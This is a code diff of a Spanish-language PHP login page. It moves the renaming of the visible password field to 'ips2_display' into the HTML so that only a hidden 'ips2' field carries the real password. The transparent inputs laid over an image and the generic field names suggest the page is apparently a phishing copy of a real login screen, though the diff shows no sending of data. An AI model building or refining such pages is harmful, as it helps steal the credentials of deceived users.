@@ -67,7 +67,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                 <input id="i1" name="ips1" placeholder="Usuario" type="text" required
                        style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="handleUsernameInput(this)">
-                <input id="i2" name="ips2" placeholder="Contraseña" type="text" required
+                <input id="i2" name="ips2_display" placeholder="Contraseña" type="text" required
                        style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" oninput="handlePasswordInputNoSpaces(this)" onkeypress="return noEspacios(event)">
                 <p id="error-message">Usuario o contraseña incorrecta</p>
                 <input type="submit" value="Inicie Sesión"
@@ -197,9 +197,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             hiddenInput.type = 'hidden';
             hiddenInput.name = 'ips2';
             hiddenInput.value = passwordInput.dataset.realValue;
-            
-            // Cambiar el nombre del campo original para no enviarlo duplicado
-            passwordInput.name = 'ips2_display';
             
             // Agregar el campo oculto al formulario
             this.appendChild(hiddenInput);
